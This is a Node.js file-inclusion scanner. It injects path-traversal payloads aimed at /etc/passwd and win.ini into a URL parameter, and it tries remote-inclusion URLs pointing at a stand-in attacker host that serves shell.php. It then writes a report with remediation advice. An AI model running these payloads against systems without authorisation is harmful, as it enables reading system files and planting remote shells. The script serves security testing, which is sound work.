#!/usr/bin/env node
/**
 * LFI/RFI (Local/Remote File Inclusion) Tester
 * Tests for file inclusion vulnerabilities.
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

class LFIRFITester {
    constructor(url) {
        this.url = url;
        this.lfiPayloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '/etc/passwd',
            'C:\\Windows\\win.ini',
            '..\\..\\..\\Windows\\win.ini'
        ];
        this.rfiPayloads = [
            'http://attacker.com/shell.php',
            'http://attacker.com/shell.txt'
        ];
        this.vulnerable = false;
    }

    makeRequest(url) {
        return new Promise((resolve, reject) => {
            const protocol = url.startsWith('https') ? https : http;
            protocol.get(url, { timeout: 10000 }, (res) => {
                let data = '';
                res.on('data', (chunk) => {
                    data += chunk;
                });
                res.on('end', () => {
                    resolve({ statusCode: res.statusCode, text: data });
                });
            }).on('error', (err) => {
                reject(err);
            });
        });
    }

    async testLFI(param) {
        console.log(`[*] Testing LFI in parameter: ${param}`);
        
        for (const payload of this.lfiPayloads) {
            try {
                const urlObj = new URL(this.url);
                urlObj.searchParams.set(param, payload);
                
                const response = await this.makeRequest(urlObj.toString());
                
                const indicators = ['root:', 'bin/bash', 'for 16-bit', '[fonts]'];
                if (indicators.some(ind => response.text.includes(ind))) {
                    console.log(`[+] Potential LFI vulnerability found with: ${payload}`);
                    this.vulnerable = true;
                    return true;
                }
            } catch (err) {
                // Ignore errors
            }
        }
        
        return false;
    }

    async testRFI(param) {
        console.log(`[*] Testing RFI in parameter: ${param}`);
        
        for (const payload of this.rfiPayloads) {
            try {
                const urlObj = new URL(this.url);
                urlObj.searchParams.set(param, payload);
                
                const response = await this.makeRequest(urlObj.toString());
                
                if (response.statusCode === 200 && response.text.length > 100) {
                    console.log(`[+] Potential RFI vulnerability found with: ${payload}`);
                    this.vulnerable = true;
                    return true;
                }
            } catch (err) {
                // Ignore errors
            }
        }
        
        return false;
    }

    generateReport() {
        let report = `# LFI/RFI Test Report for ${this.url}\n\n`;
        
        if (this.vulnerable) {
            report += `⚠️ **VULNERABLE**: File inclusion vulnerability detected!\n\n`;
        } else {
            report += `✅ No file inclusion vulnerability detected.\n\n`;
        }
        
        report += `## LFI Payloads Tested\n\n`;
        this.lfiPayloads.forEach((payload, i) => {
            report += `${i + 1}. \`${payload}\`\n`;
        });
        report += `\n`;
        
        report += `## RFI Payloads Tested\n\n`;
        this.rfiPayloads.forEach((payload, i) => {
            report += `${i + 1}. \`${payload}\`\n`;
        });
        report += `\n`;
        
        report += `## Recommendations\n\n`;
        report += `1. Use whitelist for file inclusion\n`;
        report += `2. Disable remote file inclusion\n`;
        report += `3. Validate and sanitize input\n`;
        report += `4. Use absolute paths\n`;
        report += `5. Implement proper access controls\n\n`;
        
        return report;
    }
}

async function main() {
    if (process.argv.length < 4) {
        console.log('Usage: node lfi_rfi_tester.js <url> <parameter>');
        console.log('Example: node lfi_rfi_tester.js http://example.com/page file');
        process.exit(1);
    }
    
    const url = process.argv[2];
    const param = process.argv[3];
    
    const tester = new LFIRFITester(url);
    await tester.testLFI(param);
    await tester.testRFI(param);
    
    const report = tester.generateReport();
    
    const filename = 'lfi_rfi_test_report.md';
    fs.writeFileSync(filename, report, 'utf8');
    
    console.log(`[+] LFI/RFI testing complete`);
    console.log(`[+] Report saved to ${filename}`);
    console.log(`[!] WARNING: Only test applications you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = LFIRFITester;

